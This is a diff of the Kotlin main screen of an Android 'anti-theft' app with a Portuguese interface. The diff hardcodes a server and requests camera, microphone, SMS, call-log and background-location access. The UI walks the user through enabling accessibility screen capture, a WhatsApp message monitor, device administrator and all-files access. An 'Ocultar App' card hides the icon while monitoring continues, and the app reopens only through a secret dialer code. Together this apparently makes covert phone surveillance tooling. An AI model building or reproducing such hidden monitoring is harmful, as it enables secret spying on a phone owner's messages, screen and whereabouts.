-                        cursorColor = Color(0xFF00D2FF),
-                        focusedTextColor = Color.White, unfocusedTextColor = Color.White
-                    )
-                )
-                Spacer(Modifier.height(8.dp))
-                when {
-                    linkToken.length == 9 && wsConnected -> Row(verticalAlignment = Alignment.CenterVertically) {
-                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(16.dp))
-                        Spacer(Modifier.width(6.dp))
-                        Text("✅ Aparelho vinculado e visível no painel!", color = Color(0xFF39FF14), fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
-                    }
-                    linkToken.length == 9 && linkStatus == "connecting" -> Row(verticalAlignment = Alignment.CenterVertically) {
-                        Spacer(Modifier.width(4.dp))
-                        Text("⏳ Conectando ao painel...", color = Color(0xFFFF9900), fontSize = 11.sp)
-                    }
-                    linkToken.length == 9 -> Row(verticalAlignment = Alignment.CenterVertically) {
-                        Spacer(Modifier.width(4.dp))
-                        Text("Código salvo — aguardando conexão com o servidor.", color = Color(0xFF8E94A5), fontSize = 11.sp)
-                    }
-                    linkToken.isNotEmpty() -> Text(
-                        "${linkToken.length}/9 caracteres",
-                        color = Color(0xFF8E94A5), fontSize = 10.sp
-                    )
-                }
-            }
-
-            // ── Device name card ──────────────────────────────────────────
+            // ── Nome do dispositivo ────────────────────────────────────────
             SectionCard {
                 Label("NOME DO DISPOSITIVO")
                 Spacer(Modifier.height(8.dp))
                 Text(
-                    "Dê um nome para identificar este celular no painel (ex: Celular da Maria, iPhone do João).",
+                    "Dê um nome para identificar este celular no painel.",
                     color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                     modifier = Modifier.padding(bottom = 12.dp)
                 )
@@ -449,22 +607,7 @@ class MainActivity : ComponentActivity() {
                     placeholder = { Text(defaultHwName) },
                     modifier = Modifier.fillMaxWidth(),
                     singleLine = true,
-                    colors = neonOutlinedColors(),
-                    trailingIcon = {
-                        if (deviceName.isNotEmpty()) {
-                            androidx.compose.material3.IconButton(onClick = {
-                                deviceName = ""
-                                prefs.edit().remove("device_custom_name").apply()
-                                AntiTheftService.currentModelName = defaultHwName
-                            }) {
-                                Icon(
-                                    imageVector = Icons.Default.CheckCircle,
-                                    contentDescription = "Limpar",
-                                    tint = Color(0xFF8E94A5)
-                                )
-                            }
-                        }
-                    }
+                    colors = neonOutlinedColors()
                 )
                 Spacer(Modifier.height(10.dp))
                 Button(
@@ -472,16 +615,13 @@ class MainActivity : ComponentActivity() {
                         val trimmed = deviceName.trim()
                         prefs.edit().putString("device_custom_name", trimmed).apply()
                         AntiTheftService.currentModelName = trimmed.ifEmpty { defaultHwName }
-                        // Notify running service to reconnect with new name
                         val intent = Intent(context, AntiTheftService::class.java)
                             .putExtra("DEVICE_NAME", AntiTheftService.currentModelName)
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
-                            context.startForegroundService(intent)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
                         else context.startService(intent)
                         Toast.makeText(
                             context,
-                            if (trimmed.isEmpty()) "Nome redefinido para padrão."
-                            else "Nome salvo: $trimmed",
+                            if (trimmed.isEmpty()) "Nome redefinido para padrão." else "Nome salvo!",
                             Toast.LENGTH_SHORT
                         ).show()
                     },
@@ -490,107 +630,18 @@ class MainActivity : ComponentActivity() {
                     colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                 ) {
                     Text(
-                        if (deviceName.trim().isEmpty()) "Usar nome padrão do hardware"
-                        else "💾  Salvar Nome",
+                        if (deviceName.trim().isEmpty()) "Usar nome padrão" else "Salvar Nome",
                         color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold
                     )
                 }
-                Spacer(Modifier.height(6.dp))
-                Text(
-                    "Atual: ${prefs.getString("device_custom_name","").let { if (it.isNullOrBlank()) defaultHwName else it }}",
-                    color = Color(0xFF8E94A5), fontSize = 11.sp
-                )
             }
 
-            // ── Server config card ─────────────────────────────────────────
-            SectionCard {
-                Label("ENDEREÇO DO SERVIDOR")
-                Spacer(Modifier.height(16.dp))
-                OutlinedTextField(
-                    value = serverIp, onValueChange = { serverIp = it },
-                    label = { Text("IP ou Domínio do Servidor") },
-                    placeholder = { Text("Ex: androidprotect.appbr.pro") },
-                    modifier = Modifier.fillMaxWidth(),
-                    colors = neonOutlinedColors()
-                )
-                Spacer(Modifier.height(16.dp))
-                Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(12.dp)) {
-                    OutlinedButton(
-                        onClick = {
-                            isTesting = true; testResult = null
-                            thread {
-                                testResult = try {
-                                    val ok = InetAddress.getByName(serverIp).isReachable(3000)
-                                    if (ok) "Conexão OK!" else "Servidor inalcançável."
-                                } catch (e: Exception) { "Erro: ${e.message}" }
-                                isTesting = false
-                            }
-                        },
-                        modifier = Modifier.weight(1f),
-                        enabled = !isTesting && serverIp.isNotBlank(),
-                        shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00D2FF))
-                    ) { Text(if (isTesting) "Testando..." else "Testar Conexão") }
-
-                    Button(
-                        onClick = {
-                            AntiTheftService.serverIpAddress = serverIp
-                            prefs.edit().putString("server_ip", serverIp).putBoolean("auto_start", !isServiceActive).apply()
-                            if (isServiceActive) {
-                                stopService(Intent(context, AntiTheftService::class.java))
-                                isServiceActive = false
-                            } else {
-                                startService(serverIp); isServiceActive = true
-                            }
-                        },
-                        modifier = Modifier.weight(1f),
-                        shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(
-                            containerColor = if (isServiceActive) Color(0xFFFF3838) else Color(0xFF00D2FF)
-                        )
-                    ) {
-                        Text(
-                            if (isServiceActive) "Parar Serviço" else "Iniciar Serviço",
-                            color = if (isServiceActive) Color.White else Color(0xFF0A0B10),
-                            fontWeight = FontWeight.Bold
-                        )
-                    }
-                }
-                testResult?.let {
-                    Spacer(Modifier.height(10.dp))
-                    Text(
-                        it, color = if (it.contains("OK")) Color(0xFF39FF14) else Color(0xFFFF3838),
-                        fontSize = 13.sp, fontWeight = FontWeight.Medium,
-                        modifier = Modifier.align(Alignment.CenterHorizontally)
-                    )
-                }
-            }
-
-            // ── Quick presets ──────────────────────────────────────────────
-            SectionCard {
-                Label("ATALHOS DE CONEXÃO RÁPIDA")
-                Spacer(Modifier.height(12.dp))
-                Row(Modifier.fillMaxWidth(), Arrangement.spacedBy(12.dp)) {
-                    Button(
-                        onClick = { applyServer("androidprotect.appbr.pro", serverIp) { serverIp = it; isServiceActive = true } },
-                        modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
-                    ) { Text("Servidor Oficial", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp) }
-
-                    OutlinedButton(
-                        onClick = { applyServer("10.0.2.2", serverIp) { serverIp = it; isServiceActive = true } },
-                        modifier = Modifier.weight(1f), shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFFF2A85))
-                    ) { Text("Servidor Local", fontWeight = FontWeight.Bold, fontSize = 12.sp) }
-                }
-            }
-
-            // ── Permissions card ───────────────────────────────────────────
+            // ── Permissões ─────────────────────────────────────────────────
             SectionCard {
                 Label("CENTRAL DE PERMISSÕES")
                 Spacer(Modifier.height(4.dp))
                 Text(
-                    "Todas as permissões são solicitadas automaticamente.\nSe alguma estiver bloqueada, toque em 'Abrir Configurações'.",
+                    "Todas as permissões são necessárias para o funcionamento completo.",
                     color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp,
                     modifier = Modifier.padding(bottom = 14.dp)
                 )
@@ -602,127 +653,98 @@ class MainActivity : ComponentActivity() {
                 PermRow("Estado do Telefone (IMEI/SIM)", hasPhone)
                 PermRow("Receber SMS (backup sem internet)", hasSms)
                 PermRow("Reconhecimento de Movimento", hasActivity)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    PermRow("Notificações", hasNotify)
-                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) PermRow("Notificações", hasNotify)
                 PermRow(
-                    if (hasAccessibility) "Captura de Tela Permanente (Acessibilidade) ✓"
-                    else "Captura de Tela (Acessibilidade — ativar uma vez)",
+                    if (hasAccessibility) "Captura de Tela Permanente ✓" else "Captura de Tela (Acessibilidade)",
                     hasAccessibility
                 )
                 PermRow(
-                    if (hasWhatsAppListener) "Monitor WhatsApp (Notificações) ✓"
-                    else "Monitor WhatsApp (permitir acesso às notificações)",
+                    if (hasWhatsAppListener) "Monitor WhatsApp ✓" else "Monitor WhatsApp (notificações)",
                     hasWhatsAppListener
                 )
-                if (!hasAccessibility) {
-                    PermRow("Transmissão de Tela (temporária)", hasScreen)
-                }
+                if (!hasAccessibility) PermRow("Transmissão de Tela (temporária)", hasScreen)
                 PermRow("Administrador do Dispositivo", hasAdmin)
                 PermRow("Acesso a Todos os Arquivos", hasAllFiles)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    PermRow("Sem otimização de bateria (conexão estável)", !isBatteryOptimized)
-                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+                    PermRow("Sem otimização de bateria", !isBatteryOptimized)
 
                 Spacer(Modifier.height(14.dp))
 
                 if (!allGranted) {
-                    // Battery optimization — CRITICAL for stable WebSocket connection
                     if (isBatteryOptimized && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                         Button(
                             onClick = {
-                                val intent = Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                                    data = android.net.Uri.parse("package:${context.packageName}")
-                                }
-                                context.startActivity(intent)
+                                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                                    data = Uri.parse("package:${context.packageName}")
+                                })
                             },
                             modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
                         ) {
-                            Text(
-                                "⚡  Desativar Otimização de Bateria (evita desconexões)",
-                                color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp
-                            )
+                            Text("⚡  Desativar Otimização de Bateria", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp)
                         }
                     }
 
-                    // Accessibility service (permanent screen capture)
                     if (!hasAccessibility) {
                         Button(
-                            onClick = {
-                                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                            },
+                            onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                             modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
                         ) {
-                            Text(
-                                "♿  Ativar Captura de Tela Permanente",
-                                color = Color.White, fontWeight = FontWeight.Bold, fontSize = 12.sp
-                            )
+                            Text("♿  Ativar Captura de Tela Permanente", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                         }
                         Text(
-                            "Configurações → Acessibilidade → Protect → Ativar.\nFaça isso uma vez e nunca mais será solicitado.",
+                            "Configurações → Acessibilidade → Protect → Ativar.",
                             color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                             modifier = Modifier.padding(bottom = 10.dp)
                         )
                     }
 
-                    // WhatsApp notification listener
                     if (!hasWhatsAppListener) {
                         Button(
-                            onClick = {
-                                startActivity(Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
-                            },
+                            onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                             modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366))
                         ) {
-                            Text(
-                                "💬  Permitir Ler Notificações do WhatsApp",
-                                color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp
-                            )
+                            Text("💬  Permitir Ler Notificações do WhatsApp", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                         }
                         Text(
-                            "Configurações → Acesso às notificações → Protect → Ativar.\nAssim o app pode monitorar mensagens recebidas do WhatsApp.",
+                            "Configurações → Acesso às notificações → Protect → Ativar.",
                             color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
                             modifier = Modifier.padding(bottom = 10.dp)
                         )
                     }
 
-                    // Manage all files (Android 11+)
                     if (!hasAllFiles && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                         Button(
-                            onClick = {
-                                startActivity(Intent(android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-                            },
+                            onClick = { startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)) },
                             modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
                         ) {
-                            Text("📂  Permitir Acesso a Todos os Arquivos", color = Color(0xFF0A0B10),
-                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                            Text("📂  Permitir Acesso a Todos os Arquivos", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp)
                         }
                     }
 
-                    // Device Admin activation button (separate system flow)
                     if (!hasAdmin) {
                         Button(
                             onClick = {
-                                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                                        "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota do aparelho.")
-                                }
-                                adminLauncher.launch(intent)
+                                adminLauncher.launch(
+                                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                                            "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota.")
+                                    }
+                                )
                             },
                             modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
                         ) {
-                            Text("⚙️  Ativar Administrador do Dispositivo", color = Color.Black,
-                                fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                            Text("⚙️  Ativar Administrador do Dispositivo", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                         }
                     }
 
@@ -747,20 +769,17 @@ class MainActivity : ComponentActivity() {
                             .padding(14.dp),
                         Alignment.Center
                     ) {
-                        Text(
-                            "✅  Todas as permissões concedidas. App pronto!",
-                            color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp
-                        )
+                        Text("✅  Todas as permissões concedidas. App pronto!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                     }
                 }
             }
 
-            // ── Hide app button ────────────────────────────────────────────
+            // ── Ocultar app ────────────────────────────────────────────────
             SectionCard {
                 Label("OCULTAR APLICATIVO")
                 Spacer(Modifier.height(10.dp))
                 Text(
-                    "Remove o ícone do app da gaveta de aplicativos. O serviço de monitoramento continua ativo em segundo plano.",
+                    "Remove o ícone do app. O monitoramento continua ativo em segundo plano.",
                     color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 18.sp,
                     modifier = Modifier.padding(bottom = 14.dp)
                 )
@@ -774,10 +793,7 @@ class MainActivity : ComponentActivity() {
                         Text("🙈  Ocultar App Agora", color = Color(0xFFFF2A85), fontWeight = FontWeight.Bold, fontSize = 14.sp)
                     }
                     Spacer(Modifier.height(8.dp))
-                    Text(
-                        "Para reabrir: disque *#*#7777#*#* no telefone.",
-                        color = Color(0xFF8E94A5), fontSize = 11.sp
-                    )
+                    Text("Para reabrir: disque *#*#7777#*#*", color = Color(0xFF8E94A5), fontSize = 11.sp)
                 } else {
                     Box(
                         Modifier
@@ -785,11 +801,23 @@ class MainActivity : ComponentActivity() {
                             .background(Color(0xFF1E1A0A), RoundedCornerShape(12.dp))
                             .padding(14.dp)
                     ) {
-                        Text(
-                            "⚠️ Conceda todas as permissões acima antes de ocultar o app.",
-                            color = Color(0xFFFF9900), fontSize = 12.sp
-                        )
+                        Text("⚠️ Conceda todas as permissões antes de ocultar.", color = Color(0xFFFF9900), fontSize = 12.sp)
                     }
+                }
+            }
+
+            // ── Desvincular ────────────────────────────────────────────────
+            SectionCard {
+                Label("CONTA")
+                Spacer(Modifier.height(10.dp))
+                OutlinedButton(
+                    onClick = { showUnlinkDialog = true },
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp),
+                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFFF3838)),
+                    border = androidx.compose.foundation.BorderStroke(1.dp, Color(0xFFFF3838).copy(alpha = 0.4f))
+                ) {
+                    Text("Desvincular Aparelho", fontWeight = FontWeight.Bold)
                 }
             }
 
@@ -797,11 +825,13 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // ── Helper composables ────────────────────────────────────────────────────
+    // ── Shared composables ────────────────────────────────────────────────────
     @Composable
     fun SectionCard(content: @Composable ColumnScope.() -> Unit) {
         Card(
-            modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp)
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(bottom = 20.dp)
                 .border(1.dp, Color(0xFF252630), RoundedCornerShape(16.dp)),
             colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
             shape = RoundedCornerShape(16.dp)
@@ -829,10 +859,10 @@ class MainActivity : ComponentActivity() {
     @Composable
     fun PermRow(label: String, granted: Boolean) {
         Row(
-            Modifier.fillMaxWidth().padding(vertical = 7.dp),
+            Modifier.fillMaxWidth().padding(vertical = 6.dp),
             Arrangement.SpaceBetween, Alignment.CenterVertically
         ) {
-            Text(label, color = Color.White, fontSize = 14.sp)
+            Text(label, color = Color.White, fontSize = 13.sp, modifier = Modifier.weight(1f))
             if (granted) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
                     Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(17.dp))
@@ -851,38 +881,106 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun neonOutlinedColors() = OutlinedTextFieldDefaults.colors(
-        focusedBorderColor = Color(0xFF00D2FF), unfocusedBorderColor = Color(0xFF252630),
-        focusedLabelColor = Color(0xFF00D2FF), cursorColor = Color(0xFF00D2FF),
-        focusedTextColor = Color.White, unfocusedTextColor = Color.White
+        focusedBorderColor = Color(0xFF00D2FF),
+        unfocusedBorderColor = Color(0xFF252630),
+        focusedLabelColor = Color(0xFF00D2FF),
+        cursorColor = Color(0xFF00D2FF),
+        focusedTextColor = Color.White,
+        unfocusedTextColor = Color.White
     )
 
-    // ── Helpers ───────────────────────────────────────────────────────────────
-    private fun startService(ip: String) {
-        AntiTheftService.serverIpAddress = ip
+    // ── Private helpers ───────────────────────────────────────────────────────
+    private fun launchService() {
+        AntiTheftService.serverIpAddress = SERVER_HOST
         AntiTheftService.linkToken = prefs.getString("link_token", "") ?: ""
-        prefs.edit().putString("server_ip", ip).putBoolean("auto_start", true).apply()
-        val intent = Intent(this, AntiTheftService::class.java).putExtra("SERVER_IP", ip)
+        prefs.edit().putString("server_ip", SERVER_HOST).putBoolean("auto_start", true).apply()
+        val intent = Intent(this, AntiTheftService::class.java).putExtra("SERVER_IP", SERVER_HOST)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
             else startService(intent)
         } catch (e: Exception) { Log.e("MainActivity", "Start service failed: ${e.message}") }
     }
 
-    private fun applyServer(ip: String, current: String, onDone: (String) -> Unit) {
-        AntiTheftService.serverIpAddress = ip
-        prefs.edit().putString("server_ip", ip).putBoolean("auto_start", true).apply()
-        startService(ip)
-        onDone(ip)
-        Toast.makeText(this, "Conectado: $ip", Toast.LENGTH_SHORT).show()
+    private fun startPermissionFlow() {
+        val basicNeeded = buildList {
+            if (!hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+                add(Manifest.permission.ACCESS_FINE_LOCATION)
+                add(Manifest.permission.ACCESS_COARSE_LOCATION)
+            }
+            if (!hasPermission(Manifest.permission.CAMERA))         add(Manifest.permission.CAMERA)
+            if (!hasPermission(Manifest.permission.RECORD_AUDIO))   add(Manifest.permission.RECORD_AUDIO)
+            if (!hasPermission(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
+            if (!hasPermission(Manifest.permission.RECEIVE_SMS))    add(Manifest.permission.RECEIVE_SMS)
+            if (!hasPermission(Manifest.permission.READ_SMS))       add(Manifest.permission.READ_SMS)
+            if (!hasPermission(Manifest.permission.READ_CALL_LOG))  add(Manifest.permission.READ_CALL_LOG)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+                !hasPermission(Manifest.permission.ACTIVITY_RECOGNITION)
+            ) add(Manifest.permission.ACTIVITY_RECOGNITION)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+                !hasPermission(Manifest.permission.POST_NOTIFICATIONS)
+            ) add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
+        if (basicNeeded.isNotEmpty()) {
+            Handler(Looper.getMainLooper()).postDelayed({
+                basicPermLauncher.launch(basicNeeded.toTypedArray())
+            }, 500)
+        } else {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
+                !hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+            ) {
+                Handler(Looper.getMainLooper()).postDelayed({
+                    bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                }, 500)
+            } else {
+                scheduleScreenCaptureRequest()
+            }
+        }
+    }
+
+    private fun scheduleScreenCaptureRequest(extraDelayMs: Long = 600) {
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (!prefs.getBoolean("screen_perm_granted", false)) {
+                screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
+            }
+        }, extraDelayMs)
+    }
+
+    private fun refreshPermStates() {
+        hasLocationState.value      = hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
+        hasBgLocationState.value    = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+            hasPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) else true
+        hasCameraState.value        = hasPermission(Manifest.permission.CAMERA)
+        hasMicState.value           = hasPermission(Manifest.permission.RECORD_AUDIO)
+        hasNotifyState.value        = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            hasPermission(Manifest.permission.POST_NOTIFICATIONS) else true
+        hasScreenState.value        = ProtectAccessibilityService.isEnabled(this) ||
+            (prefs.getBoolean("screen_perm_granted", false) && AntiTheftService.mediaProjectionData != null)
+        hasAccessibilityState.value = ProtectAccessibilityService.isEnabled(this)
+        hasAdminState.value         = devicePolicyManager.isAdminActive(adminComponent)
+        hasPhoneState.value         = hasPermission(Manifest.permission.READ_PHONE_STATE)
+        hasSmsState.value           = hasPermission(Manifest.permission.RECEIVE_SMS)
+        hasActivityState.value      = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
+            hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
+        hasWhatsAppListenerState.value = WhatsAppNotificationListener.isEnabled(this)
+    }
+
+    private fun hasPermission(p: String) =
+        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
+
+    private fun openAppSettings() {
+        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.fromParts("package", packageName, null)
+        })
     }
 }
 
-fun isBatteryOptimizedFor(context: android.content.Context): Boolean {
+fun isBatteryOptimizedFor(context: Context): Boolean {
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-        val pm = context.getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
+        val pm = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
         return !pm.isIgnoringBatteryOptimizations(context.packageName)
     }
-    return false // below Android M → no battery optimization restriction
+    return false
 }
 
 @Composable
